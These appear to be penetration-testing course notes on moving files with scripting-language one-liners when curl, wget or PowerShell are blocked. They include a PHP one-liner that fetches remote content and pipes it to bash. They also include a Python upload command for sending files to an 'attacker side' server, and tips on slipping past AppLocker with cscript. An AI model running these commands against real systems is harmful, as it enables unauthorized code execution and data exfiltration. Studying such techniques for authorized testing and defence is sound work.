# NOTES — Transferring Files with Code

## ID
618

## Module
File Transfers

## Kind
notes

## Title
Section 4 — Transferring Files with Code

## Description
One-liner file transfers in Python, PHP, Ruby, Perl, JavaScript (cscript/mshta), and VBScript — useful when standard binaries are missing or blocked but a language runtime is installed.

## Tags
python, php, ruby, perl, javascript, vbscript, cscript, one-liner, fileless

## Commands
- `python2.7 -c 'import urllib;urllib.urlretrieve("<url>","<out>")'`
- `python3 -c 'import urllib.request;urllib.request.urlretrieve("<url>","<out>")'`
- `php -r '$file = file_get_contents("<url>"); file_put_contents("<out>",$file);'`
- `php -r '$lines = @file("<url>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`
- `ruby -e 'require "net/http"; File.write("<out>", Net::HTTP.get(URI.parse("<url>")))'`
- `perl -e 'use LWP::Simple; getstore("<url>", "<out>");'`
- `cscript.exe /nologo wget.js <url> <out>`
- `cscript.exe /nologo wget.vbs <url> <out>`
- `python3 -c 'import requests;requests.post("<url>/upload",files={"files":open("<file>","rb")})'`

## What This Section Covers
When `curl`, `wget`, `certutil`, etc., are blocked or missing but a scripting runtime is installed, you can roll your own transfer in one line of code. Python is the most common, but PHP/Ruby/Perl/JS/VBScript all have built-in HTTP downloaders.

## Download One-Liners

### Python 2 / Python 3
```bash
# Python 2.7
python2.7 -c 'import urllib;urllib.urlretrieve("<url>", "<out>")'

# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("<url>", "<out>")'
```

### PHP (~77% of websites — likely installed on web servers)
**`file_get_contents` + `file_put_contents`:**
```bash
php -r '$file = file_get_contents("<url>"); file_put_contents("<out>",$file);'
```

**`fopen` streaming (better for large files):**
```bash
php -r 'const BUFFER = 1024; $fremote = fopen("<url>", "rb"); $flocal = fopen("<out>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

**Fileless pipe to bash:**
```bash
php -r '$lines = @file("<url>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

> The `@file` form requires `fopen` wrappers enabled in PHP config — usually on by default.

### Ruby
```bash
ruby -e 'require "net/http"; File.write("<out>", Net::HTTP.get(URI.parse("<url>")))'
```

### Perl
```bash
perl -e 'use LWP::Simple; getstore("<url>", "<out>");'
```

### JavaScript (Windows — via `cscript.exe`)
Save as `wget.js`:
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
Run: `cscript.exe /nologo wget.js <url> <out>`

### VBScript (Windows — installed since Win98)
Save as `wget.vbs`:
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
Run: `cscript.exe /nologo wget.vbs <url> <out>`

## Upload One-Liner — Python 3

### Quick form
```bash
python3 -c 'import requests;requests.post("http://<ip>:8000/upload",files={"files":open("<file>","rb")})'
```

### Expanded (for understanding)
```python
import requests
URL = "http://<ip>:8000/upload"
file = open("<file>", "rb")
r = requests.post(URL, files={"files": file})
```

Pair with `python3 -m uploadserver` on the attacker side.

## Language Selection Guide

| Target stack | First try |
|--------------|-----------|
| Linux web server | PHP (`php -r ...`) — almost guaranteed installed |
| Linux box | Python 3 (`python3 -c ...`) |
| Older Linux | Python 2 / Perl |
| Windows w/ AppLocker but `cscript` allowed | `wget.vbs` / `wget.js` |
| Windows w/ PowerShell blocked | `cscript.exe /nologo <script>` |

## Key Takeaways
- VBScript + `cscript.exe` is a great PowerShell-blocked bypass — `cscript` is rarely AppLocker'd.
- PHP's `file_get_contents` reads the whole file into memory — use the `fopen` streaming form for large binaries.
- `urllib.urlretrieve` (Py2) vs `urllib.request.urlretrieve` (Py3) — the namespace move is a common copy-paste failure.
- Pair the one-liner with a controlled server (uploadserver, your HTTPS upload endpoint) — don't pull from random GitHub when egress is monitored.

## Gotchas
- `cscript.exe` is **logged by Sysmon/EDR** — not a stealth bypass. AppLocker bypass ≠ EDR bypass.
- `php -r` only works if PHP CLI is installed — `mod_php` (Apache PHP) ≠ `php` binary on the shell.
- Ruby's `Net::HTTP.get` will fail on HTTPS without extra ssl config — use `URI.open` or add `use_ssl` for HTTPS.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-transfers]]
← [[03-linux-file-transfer-methods]] | [[05-miscellaneous-file-transfer-methods]] →
<!-- AUTO-LINKS-END -->
